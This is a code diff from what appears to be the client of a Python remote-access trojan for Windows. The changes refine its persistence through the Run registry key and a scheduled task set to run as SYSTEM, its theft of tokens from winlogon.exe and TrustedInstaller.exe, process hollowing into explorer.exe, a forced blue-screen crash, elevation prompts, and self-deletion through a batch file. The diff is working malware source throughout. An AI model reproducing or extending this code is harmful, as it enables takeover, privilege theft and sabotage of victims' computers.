@@ -22,6 +22,7 @@ import time
 import wave
 import webbrowser
 import winreg
+import zipfile
 
 import cv2
 import ntsecuritycon
@@ -359,7 +360,7 @@ class Command:
         try:
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                  winreg.KEY_WRITE)
-            winreg.SetValueEx(key, PROG_NAME, 0, winreg.REG_SZ, EXECUTABLE_PATH)
+            winreg.SetValueEx(key, PROG_NAME, 0, winreg.REG_SZ, f'"{EXECUTABLE_PATH}"')
             winreg.CloseKey(key)
             return 1, '[+] Create registry key success'
         except Exception as exception:
@@ -370,8 +371,8 @@ class Command:
         try:
             if ctypes.windll.shell32.IsUserAnAdmin():
                 cmd = subprocess.Popen(
-                    'schtasks.exe /create /tn {} /sc onlogon /ru system /rl highest /tr {} /f'.format(PROG_NAME,
-                                                                                                      EXECUTABLE_PATH),
+                    'schtasks.exe /create /tn {} /sc onlogon /ru system /rl highest /tr "{}" /f'.format(PROG_NAME,
+                                                                                                        EXECUTABLE_PATH),
                     shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 return 1, '[+] Schedule task success\n' + str(cmd.stdout.read() + cmd.stderr.read(),
                                                               locale.getdefaultlocale()[1])
@@ -447,7 +448,7 @@ class Command:
     def stealtoken_system():
         try:
             Helper.enable_privilege('SeDebugPrivilege')
-            Helper.create_process_as_user(
+            Helper.create_process_with_token(
                 Helper.duplicate_token(Helper.get_process_token(Helper.get_pid('winlogon.exe'))))
             return 1, '[+] Success'
         except Exception as exception:
@@ -458,7 +459,7 @@ class Command:
         try:
             Helper.enable_privilege('SeDebugPrivilege')
             Helper.start_service('TrustedInstaller')
-            Helper.create_process_as_user(
+            Helper.create_process_with_token(
                 Helper.duplicate_token(Helper.get_process_token(Helper.get_pid('TrustedInstaller.exe'))))
             return 1, '[+] Success'
         except Exception as exception:
@@ -638,14 +639,19 @@ class Command:
             return 0, '[-] Error: {}'.format(exception)
 
     @staticmethod
-    def runpe():
+    def runpe(args):
         try:
-            src = r'c_client.exe'
-            dst = r'C:\Windows\explorer.exe'
-            if os.path.isfile(src) and os.path.isfile(dst):
-                return 1, runpe.hollow_process(src, dst)
+            status, result = Helper.parse_arguments({'src': False, 'dst': False}, args)
+            if not status:
+                return 0, '[-] Error: {}'.format(result)
+            src = result['src'] if result['src'] else r'c_client.exe'
+            dst = result['dst'] if result['dst'] else r'C:\Windows\explorer.exe'
+            if not os.path.isfile(src):
+                return 0, '[-] File not found: {}'.format(src)
+            elif not os.path.isfile(dst):
+                return 0, '[-] File not found: {}'.format(dst)
             else:
-                return 0, '[-] File not found'
+                return 1, runpe.hollow_process(src, dst)
         except Exception as exception:
             return 0, '[-] Error: ' + str(exception)
 
@@ -657,7 +663,7 @@ class Command:
     @staticmethod
     def bsod():
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-        ctypes.windll.ntdll.RtRaiseHardError(0xc000021a, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
+        ctypes.windll.ntdll.NtRaiseHardError(0xc000021a, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
 
     @staticmethod
     def setcritical(flag):
@@ -689,18 +695,21 @@ class Command:
         try:
             if not ctypes.windll.shell32.IsUserAnAdmin():
                 if not getattr(sys, 'frozen', False):
-                    result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, ' '.join(sys.argv),
+                    result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable,
+                                                                 '"{}"'.format(' '.join(sys.argv)),
                                                                  None, 1)
                 else:
                     exec_copy = os.path.join(TEMP_DIR, os.path.basename(EXECUTABLE_PATH))
                     shutil.copy2(EXECUTABLE_PATH, exec_copy)
                     result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', r'C:\Windows\system32\cmd.exe',
-                                                                 ' /c {}'.format(exec_copy),
+                                                                 ' /c "{}"'.format(exec_copy),
                                                                  None, 1)
                 if result > 32:
                     return 1, '[+] Success'
                 else:
                     return 0, '[-] Error: {}'.format(result)
+            else:
+                return 0, '[-} Already elevated as administrator'
         except Exception as exception:
             return 0, '[-] Error: {}'.format(exception)
 
@@ -735,8 +744,13 @@ class Command:
         try:
             if path is None or not os.path.exists(path):
                 path = os.getcwd()
-            shutil.make_archive(os.path.basename(path), 'zip', path)
-            return 1, '[-] Success'
+            src = pathlib.Path(path)
+            zip_name = os.path.basename(path) + '.zip'
+            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
+                files = filter(lambda x: not x.name == zip_name, src.rglob('*'))
+                for file in files:
+                    zf.write(file, file.relative_to(src.parent))
+            return 1, '[+] Success'
         except Exception as exception:
             return 0, '[-] Error: {}'.format(exception)
 
@@ -744,8 +758,7 @@ class Command:
     def unzip(filename):
         try:
             if os.path.isfile(filename):
-                path = os.path.join(os.getcwd(), pathlib.Path(filename).stem)
-                shutil.unpack_archive(filename, path)
+                shutil.unpack_archive(filename, os.getcwd())
                 return 1, '[-] Success'
             else:
                 return 0, '[-] File not found'
@@ -802,7 +815,6 @@ class Command:
         fw.start_monitor(path, func, eof)
         while True:
             cmd = client.recv()
-            print(cmd)
             if cmd == 'stop':
                 fw.stop_monitor()
                 event.wait()
@@ -946,10 +958,12 @@ class Command:
             for cmd in cmd_list:
                 p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
-            if getattr(sys, 'frozen', False):
-                with open(TEMP_DIR + r'\cleanup.bat', 'w') as f:
-                    f.write(
-                        f'@echo off\n:loop\ntimeout /t 2 /nobreak >nul\ndel /f "{EXECUTABLE_PATH}"\nif exist "{EXECUTABLE_PATH}" goto loop\ndel /f %~f0')
+            if not getattr(sys, 'frozen', False):
+                client.send_text(1, result)
+                return
+            with open(TEMP_DIR + r'\cleanup.bat', 'w') as f:
+                f.write(
+                    f'@echo off\n:loop\ntimeout /t 2 /nobreak >nul\ndel /f "{EXECUTABLE_PATH}"\nif exist "{EXECUTABLE_PATH}" goto loop\ndel /f %~f0')
             client.send_text(1, result)
             Command.hiderun(TEMP_DIR + r'\cleanup.bat')
             Command.pkill(os.path.basename(EXECUTABLE_PATH))
@@ -1091,6 +1105,17 @@ class Helper:
     @staticmethod
     def get_linked_token(handle_token):
         return win32security.GetTokenInformation(handle_token, ntsecuritycon.TokenLinkedToken)
+
+    @staticmethod
+    def create_process_with_token(handle_token):
+        si = runpe.STARTUPINFO()
+        pi = runpe.PROCESS_INFORMATION()
+        si.cb = ctypes.sizeof(si)
+        si.lpDesktop = 'winsta0\\default'
+        creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
+        ctypes.windll.advapi32.CreateProcessWithTokenW(int(handle_token), 1, EXECUTABLE_PATH, None,
+                                                       creation_flags,
+                                                       None, None, ctypes.byref(si), ctypes.byref(pi))
 
     @staticmethod
     def create_process_as_user(handle_token):
